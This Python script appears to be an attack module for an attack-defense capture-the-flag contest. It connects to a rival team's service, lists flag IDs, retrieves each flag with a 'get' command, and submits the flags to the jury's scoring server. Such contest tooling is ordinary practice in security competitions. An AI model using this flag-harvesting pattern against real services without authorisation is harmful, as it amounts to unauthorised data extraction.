#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import uuid
import socket
import time

def send_flag(your_teamnum, jury_host, jury_port, flag):
    global requests
    url = 'http://' + jury_host + ':' + str(jury_port) + '/flag?teamid=' + str(your_teamnum) + '&flag=' + flag;
    try:
        r = requests.get(url)
        print("Try send flag " + flag)
        if r.status_code != 200:
            print("FAIL")
            print(r.text)
        else:
            print("OK!!!!")

    except:
        print ("Could not connect to jury " + url)

def get_flag(ip_address, port, flag_id):
    try:
        # print("try connect " + host + ":" + str(port))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.2)
        s.connect((ip_address, port))
        result = s.recv(1024)
        # print(result)
        s.send("get\n")
        result = s.recv(1024)
        s.send(flag_id + "\n")
        result = s.recv(1024)
        flag2 = result.strip()
        flag2 = flag2.split("FOUND FLAG: ")
        if len(flag2) == 2:
            flag2 = flag2[1]
        else:
            flag2 = ''
        s.close()
        return flag2
    except socket.timeout:
        print("socket.timeout")
    except socket.error as serr:
        print(serr)
    except Exception as e:
        print(e)
    return ''


def start(your_teamnum, jury_host, jury_port, team_name, ip_address, port):
    print("Start attack to " + team_name + " (" + ip_address + ":" + str(port) + ")")
    flag_ids = [];

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((ip_address, port))
        result = s.recv(1024)
        # print(result)
        s.send("list\n")
        result = ""
        result1 = s.recv(1024)
        while result1.strip() != "":
            result1 = s.recv(1024)
            if result1.strip() == "":
                break;
            result = result + result1
        s.close()

        result = result.split('\n')
        for i in result:
            flag_id = i.split(":")[1].strip();
            flag_ids.append(flag_id);
    except socket.timeout:
        print("Socket timeout")
    except socket.error as serr:
        print(serr)
    except Exception as e:
        print(e)

    for flag_id in flag_ids:
        flag = get_flag(ip_address, port, flag_id);
        print(flag_id + ": " + flag)
        if flag != '':
            send_flag(your_teamnum, jury_host, jury_port, flag)

    # flag = str(uuid.uuid4())
    # send_flag(your_teamnum, jury_host, jury_port, flag)